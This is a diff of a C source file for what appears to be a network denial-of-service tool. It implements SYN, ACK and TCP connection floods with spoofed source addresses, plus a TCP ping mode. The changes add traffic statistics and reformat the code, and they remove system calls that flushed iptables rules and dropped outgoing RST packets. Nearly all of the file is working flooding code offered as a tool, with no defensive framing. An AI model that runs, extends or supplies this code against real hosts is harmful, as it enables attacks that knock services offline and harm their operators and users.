@@ -18,13 +18,17 @@
 #define ACK_FLOOD  3
 #define TCP_PING   4
 
+#define MAX(a,b) (a > b ? a : b)
+#define MIN(a,b) (a < b ? a : b)
+
 /* global variables */
 int running = 1;
 uint32_t interface_addr = 0;
 const char *interface = NULL;
+const char *hostname = NULL;
 uint32_t dest_addr = 0;
 uint16_t dest_port = 0;
-uint32_t sleep_interval = 0;
+uint32_t sleep_interval = 10000;
 uint16_t action_uuid = 0;
 uint32_t run_time = 0;
 int action = TCP_PING;
@@ -99,6 +103,13 @@ void conn_flood_sniff_thread()
     int fin_received = 0;
     int alive_connections = 0;
     int new_connections = 0;
+    int tx_bytes = 0;
+    long long total_syn_sent = 0;
+    long long total_synack_received = 0;
+    long long total_rst_received = 0;
+    long long total_fin_received = 0;
+    long long total_new_connections = 0;
+    long long total_tx_bytes = 0;
     struct leef_sniffed_packet packet;
     int conn_ports[65536];
 
@@ -106,15 +117,30 @@ void conn_flood_sniff_thread()
 
     lastTicks = leef_get_ticks();
 
-    while(running) {
+    while(1) {
         ticksNow = leef_get_ticks();
-        if(run_time > 0 && ticksNow >= run_time)
-            break;
 
         /* outputs attack information */
         if(ticksNow - lastTicks >= 1000) {
-            printf("SYN: %d/s, SYN+ACK: %d/s, RST: %d/s, FIN: %d/s, NEW CONNs: %d/sec, FAILED CONNs: %d/sec, ALIVE CONNs: %d\n",
-                   syn_sent, synack_received, rst_received, fin_received, new_connections, syn_sent - new_connections, alive_connections);
+            total_syn_sent += syn_sent;
+            total_synack_received += synack_received;
+            total_rst_received += rst_received;
+            total_fin_received += fin_received;
+            total_new_connections += new_connections;
+            total_tx_bytes += tx_bytes;
+
+            if(!running || (run_time > 0 && ticksNow >= run_time))
+                break;
+
+            printf("SYN=%d/s SA=%d/s RA=%d/s FA=%d/s NEW=%d/s FAIL=%d/s ALIVE=%d TX=%.02f Kbps\n",
+                   syn_sent,
+                   synack_received,
+                   rst_received,
+                   fin_received,
+                   new_connections,
+                   MAX(syn_sent - new_connections, 0),
+                   alive_connections,
+                   (tx_bytes * 8)/1000.0f);
             fflush(stdout);
 
             synack_received = 0;
@@ -122,35 +148,59 @@ void conn_flood_sniff_thread()
             fin_received = 0;
             syn_sent = 0;
             new_connections = 0;
+            tx_bytes = 0;
             lastTicks = ticksNow;
         }
 
         if(leef_sniff_next_packet(&leef, &packet)) {
             /* check if the packet is from the host */
-            if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && packet.in_ip.tcp->source == dest_port) {
+            if(packet.ip->protocol == IPPROTO_TCP &&
+               packet.ip->saddr == dest_addr &&
+               packet.in_ip.tcp->source == dest_port) {
                 /* check if the packet was from this running attack instance */
-                if(packet.in_ip.tcp->ack == 1 && action_uuid != ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16))
+                if(packet.in_ip.tcp->ack == 1 &&
+                   action_uuid != ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16))
                     continue;
                 src_port = packet.in_ip.tcp->dest;
                 /* SYN+ACK */
                 if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 1) {
-                id = ((packet.in_ip.tcp->ack_seq - 1) & 0xffff) + 1;
-                seq = packet.in_ip.tcp->ack_seq;
-                ack_seq = packet.in_ip.tcp->seq + 1;
+                    id = ((packet.in_ip.tcp->ack_seq - 1) & 0xffff) + 1;
+                    seq = packet.in_ip.tcp->ack_seq;
+                    ack_seq = packet.in_ip.tcp->seq + 1;
 
-                if(send_data_size) {
-                    leef_send_raw_tcp(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq,
-                        TCP_ACK | TCP_PUSH, 5840, 64, send_data_size, send_data);
-                } else {
-                    leef_send_tcp_ack(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq);
-                }
+                    if(send_data_size) {
+                        leef_send_raw_tcp(&leef,
+                                          interface_addr,
+                                          dest_addr,
+                                          src_port,
+                                          dest_port,
+                                          id,
+                                          seq,
+                                          ack_seq,
+                                          TCP_ACK | TCP_PUSH,
+                                          5840,
+                                          leef_random_range(56,70),
+                                          send_data_size,
+                                          send_data);
+                        tx_bytes += 54 + send_data_size;
+                    } else {
+                        leef_send_tcp_ack(&leef,
+                                          interface_addr,
+                                          dest_addr,
+                                          src_port,
+                                          dest_port,
+                                          id,
+                                          seq,
+                                          ack_seq);
+                        tx_bytes += 54;
+                    }
 
-                synack_received++;
-                if(conn_ports[src_port] == 0) {
-                    conn_ports[src_port] = 1;
-                    alive_connections++;
-                    new_connections++;
-                }
+                    synack_received++;
+                    if(conn_ports[src_port] == 0) {
+                        conn_ports[src_port] = 1;
+                        alive_connections++;
+                        new_connections++;
+                    }
                 /* RST */
                 } else if(packet.in_ip.tcp->rst == 1) {
                     static int warned = 0;
@@ -170,7 +220,8 @@ void conn_flood_sniff_thread()
                 } else if(packet.in_ip.tcp->fin == 1) {
                     static int warned = 0;
                     if(!warned && fin_received == 0) {
-                        printf("host started ending connections, guessed connection timeout: %d secs\n", leef_get_ticks() / 1000);
+                        printf("host started ending connections, guessed connection timeout: %d secs\n",
+                               leef_get_ticks() / 1000);
                         fflush(stdout);
                         warned = 1;
                     }
@@ -184,11 +235,14 @@ void conn_flood_sniff_thread()
                 }
             /* check if the packet is to the host */
             } else if(packet.ip->protocol == IPPROTO_TCP &&
-                      packet.ip->saddr == interface_addr && packet.ip->daddr == dest_addr && packet.in_ip.tcp->dest == dest_port
-                      && packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0) {
+                      packet.ip->saddr == interface_addr &&
+                      packet.ip->daddr == dest_addr &&
+                      packet.in_ip.tcp->dest == dest_port &&
+                      packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0) {
                 if(action_uuid != ((packet.in_ip.tcp->seq & 0xffff0000) >> 16))
                     continue;
                 syn_sent++;
+                tx_bytes += 54;
                 if(conn_ports[packet.in_ip.tcp->source] == 1) {
                     conn_ports[packet.in_ip.tcp->source] = 0;
                     alive_connections--;
@@ -197,8 +251,18 @@ void conn_flood_sniff_thread()
         }
     }
 
-    /* TODO: statistics here */
-    printf("\n");
+    double connections_fail = total_syn_sent > 0 ? ((total_syn_sent-total_new_connections) * 100.0)/(double)total_syn_sent : .0;
+    printf("\n--- %s:%d connection flood statistics ---\n",  hostname, dest_port);
+    printf("%lld SYN sent, %lld ACK sent\n"
+           "%lld SA received, %lld RA received, %lld FA received\n"
+           "%lld connection made, %lld connections failed, %.02f%% connections failed\n"
+           "%d connections still alive\n"
+           "%lld packets sent, %.02f MB sent\n",
+            total_syn_sent, total_synack_received,
+            total_synack_received, total_rst_received, total_fin_received,
+            total_new_connections, total_syn_sent - total_new_connections, connections_fail,
+            alive_connections,
+            total_syn_sent+total_synack_received, total_tx_bytes/1000000.0);
 
     leef_terminate(&leef);
 }
@@ -215,17 +279,17 @@ void interface_tx_thread()
     int64_t initialTxPackets = lastTxPackets;
     int64_t initialTxBytes = lastTxBytes;
 
-    while(running) {
+    while(1) {
         ticksNow = leef_get_ticks();
-        if(run_time > 0 && ticksNow >= run_time)
+        if(!running || (run_time > 0 && ticksNow >= run_time))
             break;
         if(ticksNow - lastTicks >= 1000) {
             txPackets = leef_if_tx_packets(interface);
             txBytes = leef_if_tx_bytes(interface);
             printf("%s TX: %d pkt/s, %.02f Mbps\n",
-                interface,
-                (int)(txPackets - lastTxPackets),
-                ((txBytes - lastTxBytes)*8)/1000000.0);
+                   interface,
+                   (int)(txPackets - lastTxPackets),
+                   ((txBytes - lastTxBytes)*8)/1000000.0);
             fflush(stdout);
             lastTicks = ticksNow;
             lastTxPackets = txPackets;
@@ -233,10 +297,11 @@ void interface_tx_thread()
         }
     }
 
-    printf("--- %s:%d flood statistics ---\n", leef_addr_to_string(dest_addr), dest_port);
+    /* print stastistics */
+    printf("\n--- %s TX statistics ---\n", interface);
     printf("%lld packets sent, %.04f GB sent\n",
-        (long long)(leef_if_tx_packets(interface) - initialTxPackets),
-        (double)(leef_if_tx_bytes(interface) - initialTxBytes)/1000000.0);
+           (long long)(leef_if_tx_packets(interface) - initialTxPackets),
+           (double)(leef_if_tx_bytes(interface) - initialTxBytes)/1000000.0);
 }
 
 /* SYN flood */
@@ -246,17 +311,14 @@ void *syn_flood_attack_thread(void *param)
     if(!leef_init(&leef, INJECTING))
         return NULL;
 
-    uint32_t src_ip;
-    uint16_t src_port;
-    uint16_t id;
-    uint32_t seq;
-
     while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
-        src_ip = get_src_ip();
-        src_port = leef_random_range(1025,65535);
-        id = leef_random_u16();
-        seq = action_uuid << 16 | leef_random_u16();
-        leef_send_tcp_syn(&leef, src_ip, dest_addr, src_port, dest_port == 0 ? leef_random_u16() : dest_port, id, seq);
+        leef_send_tcp_syn(&leef,
+                          get_src_ip(),
+                          dest_addr,
+                          leef_random_range(1025,65535),
+                          dest_port == 0 ? leef_random_u16() : dest_port,
+                          leef_random_u16(),
+                          action_uuid << 16 | leef_random_u16());
         if(sleep_interval)
             usleep(sleep_interval);
     }
@@ -273,19 +335,15 @@ void *ack_flood_attack_thread(void *param)
     if(!leef_init(&leef, INJECTING))
         return NULL;
 
-    uint32_t src_ip;
-    uint16_t src_port;
-    uint16_t id;
-    uint32_t seq;
-    uint32_t ack;
-
     while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
-        src_ip = get_src_ip();
-        src_port = leef_random_range(1025,65535);
-        id = leef_random_u16();
-        seq = action_uuid << 16 | leef_random_u16();
-        ack = leef_random_u32();
-        leef_send_tcp_ack(&leef, src_ip, dest_addr, src_port, dest_port == 0 ? leef_random_u16() : dest_port, id, seq, ack);
+        leef_send_tcp_ack(&leef,
+                          get_src_ip(),
+                          dest_addr,
+                          leef_random_range(1025,65535),
+                          dest_port == 0 ? leef_random_u16() : dest_port,
+                          leef_random_u16(),
+                          action_uuid << 16 | leef_random_u16(),
+                          leef_random_u32());
         if(sleep_interval)
             usleep(sleep_interval);
     }
@@ -303,12 +361,10 @@ void tcp_ping_thread()
         return;
     leef_set_sniff_packet_size(&leef, 128);
 
-    uint32_t lastTicks;
     struct leef_sniffed_packet packet;
     uint16_t src_port = leef_random_range(1025,65535);
-    uint16_t id;
-    uint32_t seq;
     uint32_t ping_ports[65536];
+    uint32_t lastTicks;
     uint32_t ticksNow;
     memset(ping_ports, 0, sizeof(ping_ports));
     int sent = 0;
@@ -322,14 +378,11 @@ void tcp_ping_thread()
     lastTicks = leef_get_ticks();
 
     while(1) {
-        if(!running && !stopping) {
-            stopping = 1;
-            lastTicks = leef_get_ticks();
-        }
-
         ticksNow = leef_get_ticks();
-        if(run_time > 0 && ticksNow >= run_time)
-            break;
+        if((!running  || (run_time > 0 && ticksNow >= run_time)) && !stopping) {
+            stopping = 1;
+            lastTicks = ticksNow;
+        }
 
         /* outputs attack information */
         if(!stopping && ticksNow - lastTicks >= 1000) {
@@ -339,9 +392,13 @@ void tcp_ping_thread()
             if(++src_port <= 1024)
                 src_port = 1025;
 
-            id = leef_random_u16();
-            seq = action_uuid << 16 | leef_random_u16();
-            leef_send_tcp_syn(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq);
+            leef_send_tcp_syn(&leef,
+                              interface_addr,
+                              dest_addr,
+                              src_port,
+                              dest_port,
+                              leef_random_u16(),
+                              action_uuid << 16 | leef_random_u16());
             sent++;
             ping_ports[src_port] = ticksNow;
         /* wait 1 sec before stopping */
@@ -350,27 +407,38 @@ void tcp_ping_thread()
 
         if(leef_sniff_next_packet(&leef, &packet)) {
             /* check if the packet is from the host */
-            if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && packet.in_ip.tcp->source == dest_port && action_uuid == ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16)) {
+            if(packet.ip->protocol == IPPROTO_TCP &&
+               packet.ip->saddr == dest_addr &&
+               packet.in_ip.tcp->source == dest_port &&
+               action_uuid == ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16)) {
                 /* got a ping reply */
                 if(ping_ports[packet.in_ip.tcp->dest] != 0) {
                     rtt = (leef_get_ticks() - ping_ports[packet.in_ip.tcp->dest]);
-                    printf("port=%d flags=%s rrt=%d ms\n", dest_port, leef_name_tcp_flags(&packet), rtt);
+                    printf("port=%d flags=%s rrt=%d ms\n",
+                           dest_port,
+                           leef_name_tcp_flags(&packet),
+                           rtt);
                     ping_ports[packet.in_ip.tcp->dest] = 0;
                     received++;
                     rtt_sum += rtt;
-                    min_rtt = rtt < min_rtt? rtt : min_rtt;
-                    max_rtt = rtt > max_rtt? rtt : max_rtt;
+                    min_rtt = MIN(rtt, min_rtt);
+                    max_rtt = MAX(rtt, max_rtt);
                 }
             }
         }
     }
-    running = 0;
 
     /* print stastistics */
-    printf("--- %s:%d ping statistics ---\n", leef_addr_to_string(dest_addr), dest_port);
-    printf("%d packets sent, %d packets received, %.02f%% packet loss\n", sent, received, sent > 0 ? (sent - received)/(float)sent : .0f);
+    printf("\n--- %s:%d ping statistics ---\n", hostname, dest_port);
+    printf("%d packets sent, %d packets received, %.02f%% packet loss\n",
+           sent,
+           received,
+           sent > 0 ? (sent - received)/(float)sent : .0f);
     if(received > 0) {
-        printf("rtt min/avr/max = %d/%d/%d ms\n", min_rtt, (int)(rtt_sum/received), max_rtt);
+        printf("rtt min/avr/max = %d/%d/%d ms\n",
+               min_rtt,
+               (int)(rtt_sum/received),
+               max_rtt);
     }
 
     leef_terminate(&leef);
@@ -443,7 +511,8 @@ int main(int argc, char **argv)
                     }
                     break;
                 case 'h':
-                    dest_addr = leef_resolve_hostname(argv[++arg]);
+                    hostname = argv[++arg];
+                    dest_addr = leef_resolve_hostname(hostname);
                     if(dest_addr == 0) {
                         fprintf(stderr, "could not resolve hostname address\n");
                         return -1;
@@ -493,7 +562,9 @@ int main(int argc, char **argv)
                         while(!feof(fp)) {
                             fgets(ip, 32, fp);
                             char *c;
-                            while((c = strchr(ip, '\n')) || (c = strchr(ip, '\r')) || (c = strchr(ip, ' ')))
+                            while((c = strchr(ip, '\n')) ||
+                                  (c = strchr(ip, '\r')) ||
+                                  (c = strchr(ip, ' ')))
                                 c[0] = 0;
                             uint32_t addr = leef_string_to_addr(ip);
                             if(addr != 0)
@@ -564,7 +635,7 @@ int main(int argc, char **argv)
                 fprintf(stderr, "you must specify a target port for this action!\n");
                 return -1;
             }
-            printf("TCP PING %s:%d\n", leef_addr_to_string(dest_addr), dest_port);
+            printf("TCP PING %s:%d\n", hostname, dest_port);
             tcp_ping_thread();
             num_threads = 0;
             break;
@@ -573,23 +644,20 @@ int main(int argc, char **argv)
                 fprintf(stderr, "you must specify a target port for this action!\n");
                 return -1;
             }
-            /* fill some iptables rules so that the kernel doesn't mess with the attack */
-            system("iptables -F OUTPUT");
-            system("iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP");
 
-            printf("CONNECTION FLOOD %s:%d\n", leef_addr_to_string(dest_addr), dest_port);
+            printf("CONNECTION FLOOD %s:%d\n", hostname, dest_port);
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, conn_flood_attack_thread, NULL);
             conn_flood_sniff_thread();
             break;
         case SYN_FLOOD:
-            printf("SYN FLOOD %s:%d\n", leef_addr_to_string(dest_addr), dest_port);
+            printf("SYN FLOOD %s:%d\n", hostname, dest_port);
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, syn_flood_attack_thread, NULL);
             interface_tx_thread();
             break;
         case ACK_FLOOD:
-            printf("ACK FLOOD %s:%d\n", leef_addr_to_string(dest_addr), dest_port);
+            printf("ACK FLOOD %s:%d\n", hostname, dest_port);
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, ack_flood_attack_thread, NULL);
             interface_tx_thread();
